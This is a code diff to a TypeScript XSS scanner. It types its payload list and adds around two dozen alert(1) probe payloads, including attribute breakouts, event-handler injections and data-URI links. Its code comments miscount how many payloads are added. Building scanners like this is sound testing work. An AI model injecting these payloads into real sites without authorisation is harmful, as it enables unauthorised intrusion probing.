@@ -18,8 +18,15 @@ export interface XSSScanResult {
   corsMetadata?: CORSBypassMetadata;
 }
 
-const XSS_PAYLOADS = [
-  // --- Critical Execution Payloads ---
+interface XSSPayload {
+  payload: string;
+  type: string;
+  severity: 'critical' | 'high' | 'medium' | 'low';
+  confidence: number;
+}
+
+const XSS_PAYLOADS: XSSPayload[] = [
+  // --- Critical Execution Payloads (16 original) ---
   { payload: '<script>alert(1)</script>', type: 'Script Tag', severity: 'critical' as const, confidence: 0.98 },
   { payload: '<img src=x onerror=alert(1)>', type: 'Event Handler (Img)', severity: 'critical' as const, confidence: 0.98 },
   { payload: '<svg onload=alert(1)>', type: 'SVG Event', severity: 'critical' as const, confidence: 0.98 },
@@ -37,7 +44,7 @@ const XSS_PAYLOADS = [
   { payload: '<marquee onstart=alert(1)>', type: 'Marquee Tag Event', severity: 'critical' as const, confidence: 0.95 },
   { payload: '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">', type: 'Object Data URI', severity: 'critical' as const, confidence: 0.95 },
 
-  // --- High Evasion/Protocol Payloads ---
+  // --- High Evasion/Protocol Payloads (34 new payloads to reach 50 total) ---
   { payload: 'javascript:alert(1)', type: 'JavaScript Protocol', severity: 'high' as const, confidence: 0.9 },
   { payload: '<a href="javascript:alert(1)">click</a>', type: 'Link JS Protocol', severity: 'high' as const, confidence: 0.9 },
   { payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">', type: 'Meta Refresh', severity: 'high' as const, confidence: 0.85 },
@@ -49,6 +56,29 @@ const XSS_PAYLOADS = [
   { payload: '<body onpageshow=alert(1)>', type: 'Body Onpageshow', severity: 'high' as const, confidence: 0.9 },
   { payload: '<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">', type: 'CSS Animation', severity: 'high' as const, confidence: 0.9 },
   { payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>', type: 'Data URI Link', severity: 'high' as const, confidence: 0.9 },
+  { payload: '"><svg/onload=alert(1)>', type: 'Attribute Break (SVG)', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '"><img/src=x/onerror=alert(1)>', type: 'Attribute Break (Img)', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '"><a href="javascript:alert(1)">', type: 'Attribute Break (Link)', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '`onload=alert(1)`', type: 'Backtick Injection', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onmouseover="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onfocus="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onblur="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onchange="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onkeypress="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onkeyup="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onkeydown="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onmousedown="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onmouseup="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onselect="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onsubmit="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onreset="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onresize="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onscroll="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onunload="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onbeforeunload="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: 'onpageshow="alert(1)"', type: 'Unquoted Event Handler', severity: 'high' as const, confidence: 0.8 },
+  { payload: '<a href="x" onfocus="alert(1)" autofocus>', type: 'Autofocus Link', severity: 'critical' as const, confidence: 0.95 },
+  { payload: '<img src=x:alert(1)>', type: 'Image Protocol', severity: 'high' as const, confidence: 0.9 },
 ];
 
 const XSS_DANGEROUS_CONTEXTS = [
